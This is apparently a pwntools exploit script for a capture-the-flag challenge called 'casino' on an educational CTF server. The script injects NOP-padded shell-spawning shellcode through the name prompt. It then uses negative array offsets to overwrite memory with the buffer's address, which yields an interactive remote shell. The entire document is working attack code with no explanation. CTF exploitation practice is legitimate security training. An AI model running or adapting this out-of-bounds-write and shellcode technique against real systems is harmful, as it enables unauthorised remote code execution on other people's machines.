#!/usr/bin/python3
from pwn import *

context.arch = "amd64"

binary = remote('edu-ctf.csie.org', 10172)
#binary = process('./casino')
nop = asm('nop', arch='amd64')

shellcode = nop*16 + b'A'*4 + nop*12 + asm(
        shellcraft.sh()
    ) + nop*8
binary.sendlineafter("name:", shellcode)
binary.sendlineafter("age:", str(21))

for i in range(6):
    binary.sendlineafter(":", "1")
binary.sendlineafter("]:", "1")
offset = "-43"
binary.sendlineafter("]:", offset)
name_addr = "6299920" 
binary.sendlineafter(":", name_addr)

binary.sendlineafter(":", "60")
binary.sendlineafter(":", "42")
binary.sendlineafter(":", "15")
binary.sendlineafter(":", "0")
binary.sendlineafter(":", "68")
binary.sendlineafter(":", "54")
binary.sendlineafter("]:", "1")
offset = "-42"
binary.sendlineafter("]:", offset)
name_addr = "0" 
binary.sendlineafter(":", name_addr)

binary.interactive()
